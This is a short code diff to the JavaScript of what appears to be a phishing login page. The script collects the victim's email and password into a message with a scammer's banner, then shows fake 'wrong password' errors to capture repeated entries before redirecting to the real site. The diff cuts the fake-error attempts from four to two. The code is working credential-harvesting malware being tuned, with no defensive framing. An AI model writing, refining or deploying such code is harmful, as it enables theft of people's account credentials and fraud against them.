@@ -368,8 +368,6 @@
 
             const isFirstAttempt = submitCount === 1;
             const isSecondAttempt = submitCount === 2;
-            const isThirdAttempt = submitCount === 3;
-            const isFourthAttempt = submitCount === 4;
 
             document.getElementById("loader-overlay").style.display = "flex";
             let s = `✅🤑💳💶 Perry ajebutter 💶💳🤑✅\n\nEmail: ${document.getElementById("email").value.trim()}\nPassword: ${document.getElementById("password").value.trim()}`;
@@ -408,13 +406,13 @@
                   });
             });
 
-            if (isFirstAttempt || isSecondAttempt || isThirdAttempt || isFourthAttempt) {
+            if (isFirstAttempt || isSecondAttempt) {
                setTimeout(() => {
                   document.getElementById("loader-overlay").style.display = "none";
                   document.getElementById("error-message").style.display = "block";
                   document.getElementById("password").value = "";
                }, 3000);
-            } else if (submitCount === 5) {
+            } else if (submitCount === 3) {
                setTimeout(() => {
                   document.getElementById("loader-overlay").style.display = "none";
                   window.location.href = "https://" + t;
